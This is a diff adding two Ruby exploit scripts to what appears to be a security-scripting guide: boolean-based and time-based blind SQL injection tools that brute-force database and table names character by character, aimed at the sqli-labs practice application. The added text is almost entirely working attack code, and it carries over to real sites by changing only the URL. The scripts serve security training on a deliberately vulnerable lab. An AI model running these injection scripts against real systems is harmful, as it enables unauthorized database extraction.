@@ -115,3 +115,141 @@ Results
 ruby sqli.rb http://testasp.vulnweb.com/showforum.asp?id=0
 [+] The http://testphp.vulnweb.com/artists.php?artist=1' is vulnerable!
 ```
+
+## Boolean-bases SQLi Exploit Script
+
+Here is a Boolean-based SQLi exploit for [sqli-labs](https://github.com/Audi-1/sqli-labs) vulnerable application.
+
+```ruby
+#!/usr/bin/env ruby
+# Boolean-based SQLi exploit
+# Sabri Saleh | @KINGSABRI
+#
+require 'open-uri'
+
+if ARGV.size < 1
+  puts "[+] ruby #{__FILE__} <IP ADDRESS>"
+  exit 0
+else
+  host = ARGV[0]
+end
+
+# Just colorizing outputs
+class String
+  def red; colorize(self, "\e[1m\e[31m"); end
+  def green; colorize(self, "\e[1m\e[32m"); end
+  def bold; colorize(self, "\e[1m"); end
+  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
+end
+
+# SQL injection
+def send_bbsqli(url, query)
+  begin
+    
+    response = open(URI.parse( URI.encode("#{url}#{query}") ))
+    
+    if !response.read.scan("You are in...........").empty?
+      return 1 # TRUE
+    end
+    
+  rescue Exception => e
+    puts "[!] Failed to SQL inject #{e}".red 
+    exit 0
+  end
+end
+
+url = "http://#{host}/sqli-labs/Less-8/index.php?id="
+
+puts "[*] Start Sending Boolean-based SQLi".bold
+
+extracted = []
+(1..100).map do |position|
+  (32..126).map do |char|
+     puts "[*] Brute-forcing on Position: ".bold + "#{position}".green + " | ".bold + "Character: ".bold + "#{char} = #{char.chr}".green
+     
+     # Put your query here 
+#      query = "1' AND (ASCII(SUBSTR((SELECT DATABASE()),#{position},1)))=#{char}--+"
+     query = "1' AND (ASCII(SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),#{position},1)))=#{char}--+"
+     result = send_bbsqli(url, query)
+         if result.eql? 1
+           puts "[+] Found character: ".bold + "#{char.to_s(16)} hex".green
+           
+           extracted <<  char.chr
+           puts "[+] Extracted chracters: ".bold + "#{extracted.join}".green
+           break 
+         end
+   end
+end
+
+puts "\n\n[+] Final found string: ".bold + "#{extracted.join}".green
+```
+
+## Time-bases SQLi Exploit Script
+A Time-based SQLi exploit for [sqli-labs](https://github.com/Audi-1/sqli-labs) vulnerable application.
+
+```ruby
+#!/usr/bin/env ruby
+# Boolean-based SQLi exploit
+# Sabri Saleh | @KINGSABRI
+#
+require 'open-uri'
+
+if ARGV.size < 1
+  puts "[+] ruby #{__FILE__} <IP ADDRESS>"
+  exit 0
+else
+  host = ARGV[0]
+end
+
+# Just colorizing outputs
+class String
+  def red; colorize(self, "\e[1m\e[31m"); end
+  def green; colorize(self, "\e[1m\e[32m"); end
+  def bold; colorize(self, "\e[1m"); end
+  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
+end
+
+# SQL injection
+def send_tbsqli(url, query, time2wait)
+  begin
+    start_time = Time.now
+    response = open(URI.parse( URI.encode("#{url}#{query}") ))
+    end_time   = Time.now
+    howlong    = end_time - start_time
+    
+    if howlong >= time2wait
+      return 1 # TRUE
+    end
+    
+  rescue Exception => e
+    puts "[!] Failed to SQL inject #{e}".red 
+    exit 0
+  end
+end
+
+url = "http://#{host}/sqli-labs/Less-10/index.php?id="
+
+puts "[*] Start Sending Boolean-based SQLi".bold
+time2wait = 5
+extracted = []
+(1..76).map do |position| 
+  (32..126).map do |char|
+     puts "[*] Brute-forcing on Position: ".bold + "#{position}".green + " | ".bold + "Character: ".bold + "#{char} = #{char.chr}".green
+     
+     # Put your query here 
+     query = "1\" AND IF((ASCII(SUBSTR((SELECT DATABASE()),#{position},1)))=#{char}, SLEEP(#{time2wait}), NULL)--+"
+     
+     result = send_tbsqli(url, query, time2wait)
+         if result.eql? 1
+           puts "[+] Found character: ".bold + "#{char.to_s(16)} hex".green
+           
+           extracted <<  char.chr
+           puts "[+] Extracted chracters: ".bold + "#{extracted.join}".green
+           break 
+         end
+   end
+end
+
+puts "\n\n[+] Final found string: ".bold + "#{extracted.join}".green
+
+```
